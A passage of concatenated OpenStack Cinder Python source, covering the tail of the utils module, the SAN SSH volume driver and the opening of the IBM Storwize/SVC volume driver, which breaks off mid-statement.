1 >= rightnow.month:\n                year -= 1\n                month = 12 + (rightnow.month - 1)\n            else:\n                month = rightnow.month - 1\n            end = datetime.datetime(day=offset,\n                                    month=month,\n                                    year=year)\n        year = end.year\n        if 1 >= end.month:\n            year -= 1\n            month = 12 + (end.month - 1)\n        else:\n            month = end.month - 1\n        begin = datetime.datetime(day=offset, month=month, year=year)\n\n    elif unit == 'year':\n        if offset == 0:\n            offset = 1\n        end = datetime.datetime(day=1, month=offset, year=rightnow.year)\n        if end >= rightnow:\n            end = datetime.datetime(day=1,\n                                    month=offset,\n                                    year=rightnow.year - 1)\n            begin = datetime.datetime(day=1,\n                                      month=offset,\n                                      year=rightnow.year - 2)\n        else:\n            begin = datetime.datetime(day=1,\n                                      month=offset,\n                                      year=rightnow.year - 1)\n\n    elif unit == 'day':\n        end = datetime.datetime(hour=offset,\n                                day=rightnow.day,\n                                month=rightnow.month,\n                                year=rightnow.year)\n        if end >= rightnow:\n            end = end - datetime.timedelta(days=1)\n        begin = end - datetime.timedelta(days=1)\n\n    elif unit == 'hour':\n        end = rightnow.replace(minute=offset, second=0, microsecond=0)\n        if end >= rightnow:\n            end = end - datetime.timedelta(hours=1)\n        begin = end - datetime.timedelta(hours=1)\n\n    return (begin, end)\n\n\ndef generate_password(length=20, symbolgroups=DEFAULT_PASSWORD_SYMBOLS):\n    \"\"\"Generate a random password from the supplied symbol groups.\n\n    At least one symbol from each group will be included. Unpredictable\n    results if length is less than the number of symbol groups.\n\n    Believed to be reasonably secure (with a reasonable password length!)\n\n    \"\"\"\n    r = random.SystemRandom()\n\n    # NOTE(jerdfelt): Some password policies require at least one character\n    # from each group of symbols, so start off with one random character\n    # from each symbol group\n    password = [r.choice(s) for s in symbolgroups]\n    # If length < len(symbolgroups), the leading characters will only\n    # be from the first length groups. Try our best to not be predictable\n    # by shuffling and then truncating.\n    r.shuffle(password)\n    password = password[:length]\n    length -= len(password)\n\n    # then fill with random characters from all symbol groups\n    symbols = ''.join(symbolgroups)\n    password.extend([r.choice(symbols) for _i in xrange(length)])\n\n    # finally shuffle to ensure first x characters aren't from a\n    # predictable group\n    r.shuffle(password)\n\n    return ''.join(password)\n\n\ndef generate_username(length=20, symbolgroups=DEFAULT_PASSWORD_SYMBOLS):\n    # Use the same implementation as the password generation.\n    return generate_password(length, symbolgroups)\n\n\ndef last_octet(address):\n    return int(address.split('.')[-1])\n\n\ndef get_my_linklocal(interface):\n    try:\n        if_str = execute('ip', '-f', 'inet6', '-o', 'addr', 'show', interface)\n        condition = '\\s+inet6\\s+([0-9a-f:]+)/\\d+\\s+scope\\s+link'\n        links = [re.search(condition, x) for x in if_str[0].split('\\n')]\n        address = [w.group(1) for w in links if w is not None]\n        if address[0] is not None:\n            return address[0]\n        else:\n            raise exception.Error(_('Link Local address is not found.:%s')\n                                  % if_str)\n    except Exception as ex:\n        raise exception.Error(_(\"Couldn't get Link Local IP of %(interface)s\"\n                                \" :%(ex)s\") %\n                              {'interface': interface, 'ex': ex, })\n\n\ndef parse_mailmap(mailmap='.mailmap'):\n    mapping = {}\n    if os.path.exists(mailmap):\n        fp = open(mailmap, 'r')\n        for l in fp:\n            l = l.strip()\n            if not l.startswith('#') and ' ' in l:\n                canonical_email, alias = l.split(' ')\n                mapping[alias.lower()] = canonical_email.lower()\n    return mapping\n\n\ndef str_dict_replace(s, mapping):\n    for s1, s2 in mapping.iteritems():\n        s = s.replace(s1, s2)\n    return s\n\n\nclass LazyPluggable(object):\n    \"\"\"A pluggable backend loaded lazily based on some value.\"\"\"\n\n    def __init__(self, pivot, **backends):\n        self.__backends = backends\n        self.__pivot = pivot\n        self.__backend = None\n\n    def __get_backend(self):\n        if not self.__backend:\n            backend_name = CONF[self.__pivot]\n            if backend_name not in self.__backends:\n                raise exception.Error(_('Invalid backend: %s') % backend_name)\n\n            backend = self.__backends[backend_name]\n            if isinstance(backend, tuple):\n                name = backend[0]\n                fromlist = backend[1]\n            else:\n                name = backend\n                fromlist = backend\n\n            self.__backend = __import__(name, None, None, fromlist)\n            LOG.debug(_('backend %s'), self.__backend)\n        return self.__backend\n\n    def __getattr__(self, key):\n        backend = self.__get_backend()\n        return getattr(backend, key)\n\n\nclass LoopingCallDone(Exception):\n    \"\"\"Exception to break out and stop a LoopingCall.\n\n    The poll-function passed to LoopingCall can raise this exception to\n    break out of the loop normally. This is somewhat analogous to\n    StopIteration.\n\n    An optional return-value can be included as the argument to the exception;\n    this return-value will be returned by LoopingCall.wait()\n\n    \"\"\"\n\n    def __init__(self, retvalue=True):\n        \"\"\":param retvalue: Value that LoopingCall.wait() should return.\"\"\"\n        self.retvalue = retvalue\n\n\nclass LoopingCall(object):\n    def __init__(self, f=None, *args, **kw):\n        self.args = args\n        self.kw = kw\n        self.f = f\n        self._running = False\n\n    def start(self, interval, initial_delay=None):\n        self._running = True\n        done = event.Event()\n\n        def _inner():\n            if initial_delay:\n                greenthread.sleep(initial_delay)\n\n            try:\n                while self._running:\n                    self.f(*self.args, **self.kw)\n                    if not self._running:\n                        break\n                    greenthread.sleep(interval)\n            except LoopingCallDone as e:\n                self.stop()\n                done.send(e.retvalue)\n            except Exception:\n                LOG.exception(_('in looping call'))\n                done.send_exception(*sys.exc_info())\n                return\n            else:\n                done.send(True)\n\n        self.done = done\n\n        greenthread.spawn(_inner)\n        return self.done\n\n    def stop(self):\n        self._running = False\n\n    def wait(self):\n        return self.done.wait()\n\n\nclass ProtectedExpatParser(expatreader.ExpatParser):\n    \"\"\"An expat parser which disables DTD's and entities by default.\"\"\"\n\n    def __init__(self, forbid_dtd=True, forbid_entities=True,\n                 *args, **kwargs):\n        # Python 2.x old style class\n        expatreader.ExpatParser.__init__(self, *args, **kwargs)\n        self.forbid_dtd = forbid_dtd\n        self.forbid_entities = forbid_entities\n\n    def start_doctype_decl(self, name, sysid, pubid, has_internal_subset):\n        raise ValueError(\"Inline DTD forbidden\")\n\n    def entity_decl(self, entityName, is_parameter_entity, value, base,\n                    systemId, publicId, notationName):\n        raise ValueError(\"<!ENTITY> forbidden\")\n\n    def unparsed_entity_decl(self, name, base, sysid, pubid, notation_name):\n        # expat 1.2\n        raise ValueError(\"<!ENTITY> forbidden\")\n\n    def reset(self):\n        expatreader.ExpatParser.reset(self)\n        if self.forbid_dtd:\n            self._parser.StartDoctypeDeclHandler = self.start_doctype_decl\n        if self.forbid_entities:\n            self._parser.EntityDeclHandler = self.entity_decl\n            self._parser.UnparsedEntityDeclHandler = self.unparsed_entity_decl\n\n\ndef safe_minidom_parse_string(xml_string):\n    \"\"\"Parse an XML string using minidom safely.\n\n    \"\"\"\n    try:\n        return minidom.parseString(xml_string, parser=ProtectedExpatParser())\n    except sax.SAXParseException as se:\n        raise expat.ExpatError()\n\n\ndef xhtml_escape(value):\n    \"\"\"Escapes a string so it is valid within XML or XHTML.\n\n    \"\"\"\n    return saxutils.escape(value, {'\"': '&quot;', \"'\": '&apos;'})\n\n\ndef utf8(value):\n    \"\"\"Try to turn a string into utf-8 if possible.\n\n    \"\"\"\n    if isinstance(value, unicode):\n        return value.encode('utf-8')\n    elif isinstance(value, str):\n        return value\n    else:\n        raise ValueError(\"%s is not a string\" % value)\n\n\ndef get_from_path(items, path):\n    \"\"\"Returns a list of items matching the specified path.\n\n    Takes an XPath-like expression e.g. prop1/prop2/prop3, and for each item\n    in items, looks up items[prop1][prop2][prop3]. Like XPath, if any of the\n    intermediate results are lists it will treat each list item individually.\n    A 'None' in items or any child expressions will be ignored, this function\n    will not throw because of None (anywhere) in items.  The returned list\n    will contain no None values.\n\n    \"\"\"\n    if path is None:\n        raise exception.Error('Invalid mini_xpath')\n\n    (first_token, sep, remainder) = path.partition('/')\n\n    if first_token == '':\n        raise exception.Error('Invalid mini_xpath')\n\n    results = []\n\n    if items is None:\n        return results\n\n    if not isinstance(items, list):\n        # Wrap single objects in a list\n        items = [items]\n\n    for item in items:\n        if item is None:\n            continue\n        get_method = getattr(item, 'get', None)\n        if get_method is None:\n            continue\n        child = get_method(first_token)\n        if child is None:\n            continue\n        if isinstance(child, list):\n            # Flatten intermediate lists\n            for x in child:\n                results.append(x)\n        else:\n            results.append(child)\n\n    if not sep:\n        # No more tokens\n        return results\n    else:\n        return get_from_path(results, remainder)\n\n\ndef flatten_dict(dict_, flattened=None):\n    \"\"\"Recursively flatten a nested dictionary.\"\"\"\n    flattened = flattened or {}\n    for key, value in dict_.iteritems():\n        if hasattr(value, 'iteritems'):\n            flatten_dict(value, flattened)\n        else:\n            flattened[key] = value\n    return flattened\n\n\ndef partition_dict(dict_, keys):\n    \"\"\"Return two dicts, one with `keys` the other with everything else.\"\"\"\n    intersection = {}\n    difference = {}\n    for key, value in dict_.iteritems():\n        if key in keys:\n            intersection[key] = value\n        else:\n            difference[key] = value\n    return intersection, difference\n\n\ndef map_dict_keys(dict_, key_map):\n    \"\"\"Return a dict in which the dictionaries keys are mapped to new keys.\"\"\"\n    mapped = {}\n    for key, value in dict_.iteritems():\n        mapped_key = key_map[key] if key in key_map else key\n        mapped[mapped_key] = value\n    return mapped\n\n\ndef subset_dict(dict_, keys):\n    \"\"\"Return a dict that only contains a subset of keys.\"\"\"\n    subset = partition_dict(dict_, keys)[0]\n    return subset\n\n\ndef check_isinstance(obj, cls):\n    \"\"\"Checks that obj is of type cls, and lets PyLint infer types.\"\"\"\n    if isinstance(obj, cls):\n        return obj\n    raise Exception(_('Expected object of type: %s') % (str(cls)))\n    # TODO(justinsb): Can we make this better??\n    return cls()  # Ugly PyLint hack\n\n\ndef is_valid_boolstr(val):\n    \"\"\"Check if the provided string is a valid bool string or not.\"\"\"\n    val = str(val).lower()\n    return (val == 'true' or val == 'false' or\n            val == 'yes' or val == 'no' or\n            val == 'y' or val == 'n' or\n            val == '1' or val == '0')\n\n\ndef is_valid_ipv4(address):\n    \"\"\"valid the address strictly as per format xxx.xxx.xxx.xxx.\n    where xxx is a value between 0 and 255.\n    \"\"\"\n    parts = address.split(\".\")\n    if len(parts) != 4:\n        return False\n    for item in parts:\n        try:\n            if not 0 <= int(item) <= 255:\n                return False\n        except ValueError:\n            return False\n    return True\n\n\ndef monkey_patch():\n    \"\"\"If the CONF.monkey_patch set as True,\n    this function patches a decorator\n    for all functions in specified modules.\n\n    You can set decorators for each modules\n    using CONF.monkey_patch_modules.\n    The format is \"Module path:Decorator function\".\n    Example: 'cinder.api.ec2.cloud:' \\\n     cinder.openstack.common.notifier.api.notify_decorator'\n\n    Parameters of the decorator is as follows.\n    (See cinder.openstack.common.notifier.api.notify_decorator)\n\n    name - name of the function\n    function - object of the function\n    \"\"\"\n    # If CONF.monkey_patch is not True, this function do nothing.\n    if not CONF.monkey_patch:\n        return\n    # Get list of modules and decorators\n    for module_and_decorator in CONF.monkey_patch_modules:\n        module, decorator_name = module_and_decorator.split(':')\n        # import decorator function\n        decorator = importutils.import_class(decorator_name)\n        __import__(module)\n        # Retrieve module information using pyclbr\n        module_data = pyclbr.readmodule_ex(module)\n        for key in module_data.keys():\n            # set the decorator for the class methods\n            if isinstance(module_data[key], pyclbr.Class):\n                clz = importutils.import_class(\"%s.%s\" % (module, key))\n                for method, func in inspect.getmembers(clz, inspect.ismethod):\n                    setattr(\n                        clz, method,\n                        decorator(\"%s.%s.%s\" % (module, key, method), func))\n            # set the decorator for the function\n            if isinstance(module_data[key], pyclbr.Function):\n                func = importutils.import_class(\"%s.%s\" % (module, key))\n                setattr(sys.modules[module], key,\n                        decorator(\"%s.%s\" % (module, key), func))\n\n\ndef convert_to_list_dict(lst, label):\n    \"\"\"Convert a value or list into a list of dicts\"\"\"\n    if not lst:\n        return None\n    if not isinstance(lst, list):\n        lst = [lst]\n    return [{label: x} for x in lst]\n\n\ndef timefunc(func):\n    \"\"\"Decorator that logs how long a particular function took to execute\"\"\"\n    @functools.wraps(func)\n    def inner(*args, **kwargs):\n        start_time = time.time()\n        try:\n            return func(*args, **kwargs)\n        finally:\n            total_time = time.time() - start_time\n            LOG.debug(_(\"timefunc: '%(name)s' took %(total_time).2f secs\") %\n                      dict(name=func.__name__, total_time=total_time))\n    return inner\n\n\ndef generate_glance_url():\n    \"\"\"Generate the URL to glance.\"\"\"\n    # TODO(jk0): This will eventually need to take SSL into consideration\n    # when supported in glance.\n    return \"http://%s:%d\" % (CONF.glance_host, CONF.glance_port)\n\n\n@contextlib.contextmanager\ndef logging_error(message):\n    \"\"\"Catches exception, write message to the log, re-raise.\n    This is a common refinement of save_and_reraise that writes a specific\n    message to the log.\n    \"\"\"\n    try:\n        yield\n    except Exception as error:\n        with excutils.save_and_reraise_exception():\n            LOG.exception(message)\n\n\ndef make_dev_path(dev, partition=None, base='/dev'):\n    \"\"\"Return a path to a particular device.\n\n    >>> make_dev_path('xvdc')\n    /dev/xvdc\n\n    >>> make_dev_path('xvdc', 1)\n    /dev/xvdc1\n    \"\"\"\n    path = os.path.join(base, dev)\n    if partition:\n        path += str(partition)\n    return path\n\n\ndef total_seconds(td):\n    \"\"\"Local total_seconds implementation for compatibility with python 2.6\"\"\"\n    if hasattr(td, 'total_seconds'):\n        return td.total_seconds()\n    else:\n        return ((td.days * 86400 + td.seconds) * 10 ** 6 +\n                td.microseconds) / 10.0 ** 6\n\n\ndef sanitize_hostname(hostname):\n    \"\"\"Return a hostname which conforms to RFC-952 and RFC-1123 specs.\"\"\"\n    if isinstance(hostname, unicode):\n        hostname = hostname.encode('latin-1', 'ignore')\n\n    hostname = re.sub('[ _]', '-', hostname)\n    hostname = re.sub('[^\\w.-]+', '', hostname)\n    hostname = hostname.lower()\n    hostname = hostname.strip('.-')\n\n    return hostname\n\n\ndef read_cached_file(filename, cache_info, reload_func=None):\n    \"\"\"Read from a file if it has been modified.\n\n    :param cache_info: dictionary to hold opaque cache.\n    :param reload_func: optional function to be called with data when\n                        file is reloaded due to a modification.\n\n    :returns: data from file\n\n    \"\"\"\n    mtime = os.path.getmtime(filename)\n    if not cache_info or mtime != cache_info.get('mtime'):\n        with open(filename) as fap:\n            cache_info['data'] = fap.read()\n        cache_info['mtime'] = mtime\n        if reload_func:\n            reload_func(cache_info['data'])\n    return cache_info['data']\n\n\ndef hash_file(file_like_object):\n    \"\"\"Generate a hash for the contents of a file.\"\"\"\n    checksum = hashlib.sha1()\n    any(map(checksum.update, iter(lambda: file_like_object.read(32768), '')))\n    return checksum.hexdigest()\n\n\n@contextlib.contextmanager\ndef temporary_mutation(obj, **kwargs):\n    \"\"\"Temporarily set the attr on a particular object to a given value then\n    revert when finished.\n\n    One use of this is to temporarily set the read_deleted flag on a context\n    object:\n\n        with temporary_mutation(context, read_deleted=\"yes\"):\n            do_something_that_needed_deleted_objects()\n    \"\"\"\n    NOT_PRESENT = object()\n\n    old_values = {}\n    for attr, new_value in kwargs.items():\n        old_values[attr] = getattr(obj, attr, NOT_PRESENT)\n        setattr(obj, attr, new_value)\n\n    try:\n        yield\n    finally:\n        for attr, old_value in old_values.items():\n            if old_value is NOT_PRESENT:\n                del obj[attr]\n            else:\n                setattr(obj, attr, old_value)\n\n\ndef service_is_up(service):\n    \"\"\"Check whether a service is up based on last heartbeat.\"\"\"\n    last_heartbeat = service['updated_at'] or service['created_at']\n    # Timestamps in DB are UTC.\n    elapsed = total_seconds(timeutils.utcnow() - last_heartbeat)\n    return abs(elapsed) <= CONF.service_down_time\n\n\ndef generate_mac_address():\n    \"\"\"Generate an Ethernet MAC address.\"\"\"\n    # NOTE(vish): We would prefer to use 0xfe here to ensure that linux\n    #             bridge mac addresses don't change, but it appears to\n    #             conflict with libvirt, so we use the next highest octet\n    #             that has the unicast and locally administered bits set\n    #             properly: 0xfa.\n    #             Discussion: https://bugs.launchpad.net/cinder/+bug/921838\n    mac = [0xfa, 0x16, 0x3e,\n           random.randint(0x00, 0x7f),\n           random.randint(0x00, 0xff),\n           random.randint(0x00, 0xff)]\n    return ':'.join(map(lambda x: \"%02x\" % x, mac))\n\n\ndef read_file_as_root(file_path):\n    \"\"\"Secure helper to read file as root.\"\"\"\n    try:\n        out, _err = execute('cat', file_path, run_as_root=True)\n        return out\n    except exception.ProcessExecutionError:\n        raise exception.FileNotFound(file_path=file_path)\n\n\n@contextlib.contextmanager\ndef temporary_chown(path, owner_uid=None):\n    \"\"\"Temporarily chown a path.\n\n    :params owner_uid: UID of temporary owner (defaults to current user)\n    \"\"\"\n    if owner_uid is None:\n        owner_uid = os.getuid()\n\n    orig_uid = os.stat(path).st_uid\n\n    if orig_uid != owner_uid:\n        execute('chown', owner_uid, path, run_as_root=True)\n    try:\n        yield\n    finally:\n        if orig_uid != owner_uid:\n            execute('chown', orig_uid, path, run_as_root=True)\n\n\n@contextlib.contextmanager\ndef tempdir(**kwargs):\n    tmpdir = tempfile.mkdtemp(**kwargs)\n    try:\n        yield tmpdir\n    finally:\n        try:\n            shutil.rmtree(tmpdir)\n        except OSError as e:\n            LOG.debug(_('Could not remove tmpdir: %s'), str(e))\n\n\ndef strcmp_const_time(s1, s2):\n    \"\"\"Constant-time string comparison.\n\n    :params s1: the first string\n    :params s2: the second string\n\n    :return: True if the strings are equal.\n\n    This function takes two strings and compares them.  It is intended to be\n    used when doing a comparison for authentication purposes to help guard\n    against timing attacks.\n    \"\"\"\n    if len(s1) != len(s2):\n        return False\n    result = 0\n    for (a, b) in zip(s1, s2):\n        result |= ord(a) ^ ord(b)\n    return result == 0\n\n\ndef walk_class_hierarchy(clazz, encountered=None):\n    \"\"\"Walk class hierarchy, yielding most derived classes first\"\"\"\n    if not encountered:\n        encountered = []\n    for subclass in clazz.__subclasses__():\n        if subclass not in encountered:\n            encountered.append(subclass)\n            # drill down to leaves first\n            for subsubclass in walk_class_hierarchy(subclass, encountered):\n                yield subsubclass\n            yield subclass\n\n\nclass UndoManager(object):\n    \"\"\"Provides a mechanism to facilitate rolling back a series of actions\n    when an exception is raised.\n    \"\"\"\n    def __init__(self):\n        self.undo_stack = []\n\n    def undo_with(self, undo_func):\n        self.undo_stack.append(undo_func)\n\n    def _rollback(self):\n        for undo_func in reversed(self.undo_stack):\n            undo_func()\n\n    def rollback_and_reraise(self, msg=None, **kwargs):\n        \"\"\"Rollback a series of actions then re-raise the exception.\n\n        .. note:: (sirp) This should only be called within an\n                  exception handler.\n        \"\"\"\n        with excutils.save_and_reraise_exception():\n            if msg:\n                LOG.exception(msg, **kwargs)\n\n            self._rollback()\n/n/n/ncinder/volume/drivers/san/san.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2011 Justin Santa Barbara\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nDefault Driver for san-stored volumes.\n\nThe unique thing about a SAN is that we don't expect that we can run the volume\ncontroller on the SAN hardware.  We expect to access it over SSH or some API.\n\"\"\"\n\nimport random\n\nfrom eventlet import greenthread\nfrom oslo.config import cfg\n\nfrom cinder import exception\nfrom cinder.openstack.common import excutils\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nfrom cinder.volume import driver\n\nLOG = logging.getLogger(__name__)\n\nsan_opts = [\n    cfg.BoolOpt('san_thin_provision',\n                default=True,\n                help='Use thin provisioning for SAN volumes?'),\n    cfg.StrOpt('san_ip',\n               default='',\n               help='IP address of SAN controller'),\n    cfg.StrOpt('san_login',\n               default='admin',\n               help='Username for SAN controller'),\n    cfg.StrOpt('san_password',\n               default='',\n               help='Password for SAN controller',\n               secret=True),\n    cfg.StrOpt('san_private_key',\n               default='',\n               help='Filename of private key to use for SSH authentication'),\n    cfg.StrOpt('san_clustername',\n               default='',\n               help='Cluster name to use for creating volumes'),\n    cfg.IntOpt('san_ssh_port',\n               default=22,\n               help='SSH port to use with SAN'),\n    cfg.BoolOpt('san_is_local',\n                default=False,\n                help='Execute commands locally instead of over SSH; '\n                     'use if the volume service is running on the SAN device'),\n    cfg.IntOpt('ssh_conn_timeout',\n               default=30,\n               help=\"SSH connection timeout in seconds\"),\n    cfg.IntOpt('ssh_min_pool_conn',\n               default=1,\n               help='Minimum ssh connections in the pool'),\n    cfg.IntOpt('ssh_max_pool_conn',\n               default=5,\n               help='Maximum ssh connections in the pool'),\n]\n\nCONF = cfg.CONF\nCONF.register_opts(san_opts)\n\n\nclass SanDriver(driver.VolumeDriver):\n    \"\"\"Base class for SAN-style storage volumes\n\n    A SAN-style storage value is 'different' because the volume controller\n    probably won't run on it, so we need to access is over SSH or another\n    remote protocol.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        execute = kwargs.pop('execute', self.san_execute)\n        super(SanDriver, self).__init__(execute=execute,\n                                        *args, **kwargs)\n        self.configuration.append_config_values(san_opts)\n        self.run_local = self.configuration.san_is_local\n        self.sshpool = None\n\n    def san_execute(self, *cmd, **kwargs):\n        if self.run_local:\n            return utils.execute(*cmd, **kwargs)\n        else:\n            check_exit_code = kwargs.pop('check_exit_code', None)\n            command = ' '.join(cmd)\n            return self._run_ssh(command, check_exit_code)\n\n    def _run_ssh(self, cmd_list, check_exit_code=True, attempts=1):\n        utils.check_ssh_injection(cmd_list)\n        command = ' '. join(cmd_list)\n\n        if not self.sshpool:\n            password = self.configuration.san_password\n            privatekey = self.configuration.san_private_key\n            min_size = self.configuration.ssh_min_pool_conn\n            max_size = self.configuration.ssh_max_pool_conn\n            self.sshpool = utils.SSHPool(self.configuration.san_ip,\n                                         self.configuration.san_ssh_port,\n                                         self.configuration.ssh_conn_timeout,\n                                         self.configuration.san_login,\n                                         password=password,\n                                         privatekey=privatekey,\n                                         min_size=min_size,\n                                         max_size=max_size)\n        last_exception = None\n        try:\n            total_attempts = attempts\n            with self.sshpool.item() as ssh:\n                while attempts > 0:\n                    attempts -= 1\n                    try:\n                        return utils.ssh_execute(\n                            ssh,\n                            command,\n                            check_exit_code=check_exit_code)\n                    except Exception as e:\n                        LOG.error(e)\n                        last_exception = e\n                        greenthread.sleep(random.randint(20, 500) / 100.0)\n                try:\n                    raise exception.ProcessExecutionError(\n                        exit_code=last_exception.exit_code,\n                        stdout=last_exception.stdout,\n                        stderr=last_exception.stderr,\n                        cmd=last_exception.cmd)\n                except AttributeError:\n                    raise exception.ProcessExecutionError(\n                        exit_code=-1,\n                        stdout=\"\",\n                        stderr=\"Error running SSH command\",\n                        cmd=command)\n\n        except Exception:\n            with excutils.save_and_reraise_exception():\n                LOG.error(_(\"Error running SSH command: %s\") % command)\n\n    def ensure_export(self, context, volume):\n        \"\"\"Synchronously recreates an export for a logical volume.\"\"\"\n        pass\n\n    def create_export(self, context, volume):\n        \"\"\"Exports the volume.\"\"\"\n        pass\n\n    def remove_export(self, context, volume):\n        \"\"\"Removes an export for a logical volume.\"\"\"\n        pass\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        if not self.run_local:\n            if not (self.configuration.san_password or\n                    self.configuration.san_private_key):\n                raise exception.InvalidInput(\n                    reason=_('Specify san_password or san_private_key'))\n\n        # The san_ip must always be set, because we use it for the target\n        if not self.configuration.san_ip:\n            raise exception.InvalidInput(reason=_(\"san_ip must be set\"))\n\n\nclass SanISCSIDriver(SanDriver, driver.ISCSIDriver):\n    def __init__(self, *args, **kwargs):\n        super(SanISCSIDriver, self).__init__(*args, **kwargs)\n\n    def _build_iscsi_target_name(self, volume):\n        return \"%s%s\" % (self.configuration.iscsi_target_prefix,\n                         volume['name'])\n/n/n/ncinder/volume/drivers/storwize_svc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2013 IBM Corp.\n# Copyright 2012 OpenStack LLC.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n# Authors:\n#   Ronen Kat <ronenkat@il.ibm.com>\n#   Avishay Traeger <avishay@il.ibm.com>\n\n\"\"\"\nVolume driver for IBM Storwize family and SVC storage systems.\n\nNotes:\n1. If you specify both a password and a key file, this driver will use the\n   key file only.\n2. When using a key file for authentication, it is up to the user or\n   system administrator to store the private key in a safe manner.\n3. The defaults for creating volumes are \"-rsize 2% -autoexpand\n   -grainsize 256 -warning 0\".  These can be changed in the configuration\n   file or by using volume types(recommended only for advanced users).\n\nLimitations:\n1. The driver expects CLI output in English, error messages may be in a\n   localized format.\n2. Clones and creating volumes from snapshots, where the source and target\n   are of different sizes, is not supported.\n\n\"\"\"\n\nimport random\nimport re\nimport string\nimport time\n\nfrom oslo.config import cfg\n\nfrom cinder import context\nfrom cinder import exception\nfrom cinder.openstack.common import excutils\nfrom cinder.openstack.common import log as logging\nfrom cinder.openstack.common import strutils\nfrom cinder import utils\nfrom cinder.volume.drivers.san import san\nfrom cinder.volume import volume_types\n\nVERSION = 1.1\nLOG = logging.getLogger(__name__)\n\nstorwize_svc_opts = [\n    cfg.StrOpt('storwize_svc_volpool_name',\n               default='volpool',\n               help='Storage system storage pool for volumes'),\n    cfg.IntOpt('storwize_svc_vol_rsize',\n               default=2,\n               help='Storage system space-efficiency parameter for volumes '\n                    '(percentage)'),\n    cfg.IntOpt('storwize_svc_vol_warning',\n               default=0,\n               help='Storage system threshold for volume capacity warnings '\n                    '(percentage)'),\n    cfg.BoolOpt('storwize_svc_vol_autoexpand',\n                default=True,\n                help='Storage system autoexpand parameter for volumes '\n                     '(True/False)'),\n    cfg.IntOpt('storwize_svc_vol_grainsize',\n               default=256,\n               help='Storage system grain size parameter for volumes '\n                    '(32/64/128/256)'),\n    cfg.BoolOpt('storwize_svc_vol_compression',\n                default=False,\n                help='Storage system compression option for volumes'),\n    cfg.BoolOpt('storwize_svc_vol_easytier',\n                default=True,\n                help='Enable Easy Tier for volumes'),\n    cfg.IntOpt('storwize_svc_flashcopy_timeout',\n               default=120,\n               help='Maximum number of seconds to wait for FlashCopy to be '\n                    'prepared. Maximum value is 600 seconds (10 minutes).'),\n    cfg.StrOpt('storwize_svc_connection_protocol',\n               default='iSCSI',\n               help='Connection protocol (iSCSI/FC)'),\n    cfg.BoolOpt('storwize_svc_multipath_enabled',\n                default=False,\n                help='Connect with multipath (currently FC-only)'),\n    cfg.BoolOpt('storwize_svc_multihostmap_enabled',\n                default=True,\n                help='Allows vdisk to multi host mapping'),\n]\n\n\nCONF = cfg.CONF\nCONF.register_opts(storwize_svc_opts)\n\n\nclass StorwizeSVCDriver(san.SanDriver):\n    \"\"\"IBM Storwize V7000 and SVC iSCSI/FC volume driver.\n\n    Version history:\n    1.0 - Initial driver\n    1.1 - FC support, create_cloned_volume, volume type support,\n          get_volume_stats, minor bug fixes\n\n    \"\"\"\n\n    \"\"\"=====================================================================\"\"\"\n    \"\"\" SETUP                                                               \"\"\"\n    \"\"\"=====================================================================\"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(StorwizeSVCDriver, self).__init__(*args, **kwargs)\n        self.configuration.append_config_values(storwize_svc_opts)\n        self._storage_nodes = {}\n        self._enabled_protocols = set()\n        self._compression_enabled = False\n        self._context = None\n\n        # Build cleanup translation tables for host names\n        invalid_ch_in_host = ''\n        for num in range(0, 128):\n            ch = str(chr(num))\n            if (not ch.isalnum() and ch != ' ' and ch != '.'\n                    and ch != '-' and ch != '_'):\n                invalid_ch_in_host = invalid_ch_in_host + ch\n        self._string_host_name_filter = string.maketrans(\n            invalid_ch_in_host, '-' * len(invalid_ch_in_host))\n\n        self._unicode_host_name_filter = dict((ord(unicode(char)), u'-')\n                                              for char in invalid_ch_in_host)\n\n    def _get_iscsi_ip_addrs(self):\n        generator = self._port_conf_generator(['svcinfo', 'lsportip'])\n        header = next(generator, None)\n        if not header:\n            return\n\n        for port_data in generator:\n            try:\n                port_node_id = port_data['node_id']\n                port_ipv4 = port_data['IP_address']\n                port_ipv6 = port_data['IP_address_6']\n                state = port_data['state']\n            except KeyError:\n                self._handle_keyerror('lsportip', header)\n\n            if port_node_id in self._storage_nodes and (\n                    state == 'configured' or state == 'online'):\n                node = self._storage_nodes[port_node_id]\n                if len(port_ipv4):\n                    node['ipv4'].append(port_ipv4)\n                if len(port_ipv6):\n                    node['ipv6'].append(port_ipv6)\n\n    def _get_fc_wwpns(self):\n        for key in self._storage_nodes:\n            node = self._storage_nodes[key]\n            ssh_cmd = ['svcinfo', 'lsnode', '-delim', '!', node['id']]\n            raw = self._run_ssh(ssh_cmd)\n            resp = CLIResponse(raw, delim='!', with_header=False)\n            wwpns = set(node['WWPN'])\n            for i, s in resp.select('port_id', 'port_status'):\n                if 'unconfigured' != s:\n                    wwpns.add(i)\n            node['WWPN'] = list(wwpns)\n            LOG.info(_('WWPN on node %(node)s: %(wwpn)s')\n                     % {'node': node['id'], 'wwpn': node['WWPN']})\n\n    def do_setup(self, ctxt):\n        \"\"\"Check that we have all configuration details from the storage.\"\"\"\n\n        LOG.debug(_('enter: do_setup'))\n        self._context = ctxt\n\n        # Validate that the pool exists\n        ssh_cmd = ['svcinfo', 'lsmdiskgrp', '-delim', '!', '-nohdr']\n        out, err = self._run_ssh(ssh_cmd)\n        self._assert_ssh_return(len(out.strip()), 'do_setup',\n                                ssh_cmd, out, 